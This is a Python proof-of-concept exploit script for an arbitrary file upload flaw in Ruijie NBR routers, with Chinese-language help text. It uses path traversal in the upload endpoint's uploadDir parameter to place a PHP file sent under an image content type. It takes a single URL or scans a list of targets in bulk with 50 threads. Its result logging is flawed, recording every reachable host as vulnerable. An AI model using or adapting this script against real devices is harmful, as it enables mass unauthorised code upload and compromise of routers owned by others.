# 锐捷 NBR 路由器任意文件上传漏洞复现
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """
██████╗      ██╗      ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
██╔══██╗     ██║      ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
██████╔╝     ██║█████╗██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
██╔══██╗██   ██║╚════╝██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
██║  ██║╚█████╔╝      ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
╚═╝  ╚═╝ ╚════╝        ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                        
                                                author:果冻
"""
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='锐捷 NBR 路由器任意文件上传漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_payload = '/ddi/server/fileupload.php?uploadDir=../../321&name=123.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }
    files = {
        'file': ('111.php', '<?php phpinfo();?>', 'image/jpeg')
    }
    try:
        res = requests.get(url=target, verify=False, timeout=10)
        if res.status_code == 200:
            response = requests.post(url=target+api_payload, headers=headers, files=files, verify=False, timeout=10)
            if response.status_code == 200 and '123.php' in response.text:
                print(f"[+]{target} 存在文件上传漏洞")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在文件上传漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")



if __name__ == '__main__':
    main()